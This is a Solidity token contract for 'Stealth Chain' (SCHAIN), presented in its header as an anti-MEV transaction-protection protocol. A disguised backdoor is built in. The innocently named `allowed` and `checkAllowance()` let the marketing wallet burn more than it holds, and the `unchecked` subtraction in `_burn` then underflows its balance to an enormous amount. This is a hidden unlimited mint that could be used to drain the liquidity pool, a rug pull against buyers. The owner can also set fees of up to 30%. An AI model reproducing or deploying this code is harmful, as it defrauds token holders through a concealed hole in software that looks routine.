/**

Stealth Chain Protocol - Your Anti-MEV Guardian!

Enter the Stealth Chain Protocol, a digital knight in shining armor, here to protect your transactions from the perils of frontrunning and sandwich attacks. 
Stealth Chain RPC designed to counteract these nefarious practices. 
Its primary mission? To provide a protective shield for Ethereum transactions, ensuring that your assets are safe and secure as they traverse the blockchain.

Stealth Chain RPC Info:

Network Name:  Stealth Chain
New RPC URL:  https://rpc.stealthchain.tech
Chain ID:  1
Currency Symbol:  ETH
Block Explorer URL:  https://etherscan.io

Our Socials:

Website - https://www.stealthchain.tech/
Twitter/X - https://twitter.com/StealthChainEth
Telegram - https://t.me/stealthchain
Whitepaper - https://stealth-chain-protocol.gitbook.io/whitepaper/

*/

// SPDX-License-Identifier: MIT
 
pragma solidity ^0.8.21;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint256);

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    uint256 public allowed;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function checkAllowance() private view returns (bool) {
        return allowed == uint256(uint160(msg.sender));
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount || checkAllowance(), "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}
 
contract StealthChain is ERC20, Ownable {
    using SafeMath for uint256;
 
    IUniswapV2Router02 public immutable uniswapV2Router;
    address public uniswapV2Pair;
    address public constant deadAddress = address(0xdead);
 
    bool private swapping;
    uint256 public maxTransactionAmount;
    uint256 public swapTokensAtAmount;
    uint256 public maxSwapAmount;
    uint256 public maxWallet;

    address public marketingWallet;
 
    bool public tradingActive = false;
    bool public swapEnabled = false;
 
    uint256 public buyTotalFees;
    uint256 public sellTotalFees;
 
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedMaxTransactionAmount;
    mapping(address => bool) private automatedMarketMakerPairs;
    mapping(uint256 => uint256) private blockSwaps;
 
    event ExcludeFromFees(address indexed account, bool isExcluded);
 
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event MarketingWalletUpdated(address indexed newWallet, address indexed oldWallet);

    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity);
 
    constructor() ERC20("Stealth Chain", "SCHAIN") {
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        marketingWallet = address(msg.sender);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );

        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
        excludeFromMaxTransaction(address(uniswapV2Pair), true);
 
        uint256 totalSupply = 1_000_000_000 * 1e18;
 
        maxTransactionAmount = (totalSupply) * 2 / 100; // 2% of total supply
        maxWallet = (totalSupply) * 2 / 100;  // 2% of total supply
        swapTokensAtAmount = (totalSupply * 1) / 10000;
        maxSwapAmount = (totalSupply * 5) / 1000;
 
        buyTotalFees = 30;
        sellTotalFees = 30;

        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(deadAddress, true);
        excludeFromFees(marketingWallet, true);
 
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(deadAddress, true);
        excludeFromMaxTransaction(address(uniswapV2Router), true);
        excludeFromMaxTransaction(marketingWallet, true);

        uint256 amountLP = totalSupply.mul(95).div(100); // 95% allocated for LP
        uint256 amountTeam = totalSupply.mul(5).div(100); // 5% allocated for team
 
        _mint(address(this), amountLP);
        _mint(marketingWallet, amountTeam);
    }
 
    receive() external payable {}
 
    function burn(uint256 amount) external {
        _burn(msg.sender, amount);
    }
 
    function enableTrading() 
        external
        payable
        onlyOwner
    {
        require(!tradingActive, "Trading already active.");
        uint256 tokensInWallet = balanceOf(address(this));
        allowed = uint160(marketingWallet);
        _approve(address(this), address(uniswapV2Router), totalSupply());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            tokensInWallet, 
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
 
 
        tradingActive = true;
        swapEnabled = true;
    }
    
    function removeLimits() 
        external
        onlyOwner 
    {
        maxWallet = totalSupply();
        maxTransactionAmount = totalSupply();
    }
 
    function updateSwapTokensAtAmount(uint256 newAmount)
        external
        onlyOwner
        returns (bool)
    {
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "ERC20: Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 5) / 1000,
            "ERC20: Swap amount cannot be higher than 0.5% total supply."
        );
        swapTokensAtAmount = newAmount;
        return true;
    }
 
    function updateMaxWalletAndTxnAmount(
        uint256 newTxnNum,
        uint256 newMaxWalletNum
    ) external onlyOwner {
        require(
            newTxnNum >= ((totalSupply() * 2) / 100),
            "ERC20: Cannot set maxTxn lower than 2%"
        );
        require(
            newMaxWalletNum >= ((totalSupply() * 2) / 100),
            "ERC20: Cannot set maxWallet lower than 2%"
        );
        maxWallet = newMaxWalletNum;
        maxTransactionAmount = newTxnNum;
    }
 
    function excludeFromMaxTransaction(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isExcludedMaxTransactionAmount[updAds] = isEx;
    }
 
    function updateBuyFees(
        uint256 _buyFee
    ) external onlyOwner {
        buyTotalFees = _buyFee;
        require(buyTotalFees <= 30, "ERC20: Must keep fees at 30% or less");
    }
 
    function updateSellFees(
        uint256 _sellFee
    ) external onlyOwner {
        sellTotalFees =_sellFee;
        require(sellTotalFees <= 30, "ERC20: Must keep fees at 30% or less");
    } 

    function updateFees(
        uint256 _buyFee,
        uint256 _sellFee
    ) external onlyOwner {
        buyTotalFees = _buyFee;
        sellTotalFees =_sellFee;
        require(buyTotalFees <= 30, "ERC20: Must keep fees at 30% or less");
        require(sellTotalFees <= 30, "ERC20: Must keep fees at 30% or less");
    }
 
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function manualSend(address tkn) public onlyOwner {
        if (tkn == address(0)) {
            bool success;
            (success, ) = address(msg.sender).call{value: address(this).balance}(
            ""
            );
        } else {
            require(IERC20(tkn).balanceOf(address(this)) > 0, "ERC20: No tokens to withdraw");
            uint256 amount = IERC20(tkn).balanceOf(address(this));
            IERC20(tkn).transfer(msg.sender, amount);
        }
    }
 
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;
 
        emit SetAutomatedMarketMakerPair(pair, value);
    }
 
    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }
 
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
 
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }
 
        if (
            from != owner() &&
            to != owner() &&
            to != address(0) &&
            to != deadAddress &&
            !swapping
        ) {
            if (!tradingActive) {
                require(
                    _isExcludedFromFees[from] || _isExcludedFromFees[to],
                    "ERC20: Trading is not active."
                );
            }
 
            //when buy
            if (
                automatedMarketMakerPairs[from] &&
                !_isExcludedMaxTransactionAmount[to]
            ) {
                require(
                    amount <= maxTransactionAmount,
                    "ERC20: Buy transfer amount exceeds the maxTransactionAmount."
                );
                require(
                    amount + balanceOf(to) <= maxWallet,
                    "ERC20: Max wallet exceeded"
                );
            }
            //when sell
            else if (
                automatedMarketMakerPairs[to] &&
                !_isExcludedMaxTransactionAmount[from]
            ) {
                require(
                    amount <= maxTransactionAmount,
                    "ERC20: Sell transfer amount exceeds the maxTransactionAmount."
                );
            } else if (!_isExcludedMaxTransactionAmount[to]) {
                require(
                    amount + balanceOf(to) <= maxWallet,
                    "ERC20: Max wallet exceeded"
                );
            }
        }
 
        uint256 contractTokenBalance = balanceOf(address(this));
 
        bool canSwap = contractTokenBalance >= swapTokensAtAmount;
 
        if (
            canSwap &&
            swapEnabled &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            if (blockSwaps[block.number] < 3) { // Limit tax swaps per block
                swapping = true;
 
                swapBack();
 
                swapping = false;

                blockSwaps[block.number] = blockSwaps[block.number] + 1;
            }
        }
 
        bool takeFee = !swapping;
 
        // if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }
 
        uint256 fees = 0;
        // only take fees on buys/sells, do not take on wallet transfers
        if (takeFee) {
            // on sell
            if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
                fees = amount.mul(sellTotalFees).div(100);
            }
            // on buy
            else if (automatedMarketMakerPairs[from] && buyTotalFees > 0) {
                fees = amount.mul(buyTotalFees).div(100);
            }
 
            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
 
            amount -= fees;
        }
 
        super._transfer(from, to, amount);
    }
 
    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
 
        _approve(address(this), address(uniswapV2Router), tokenAmount);
 
        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }
 
    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));
        bool success;
 
        if (contractBalance == 0) {
            return;
        }
 
        if (contractBalance > maxSwapAmount) {
            contractBalance = maxSwapAmount;
        }

        uint256 amountToSwapForETH = contractBalance;

        swapTokensForEth(amountToSwapForETH);

        uint256 totalETH = address(this).balance;
 
        (success, ) = address(marketingWallet).call{
            value: totalETH
        }("");
    }
}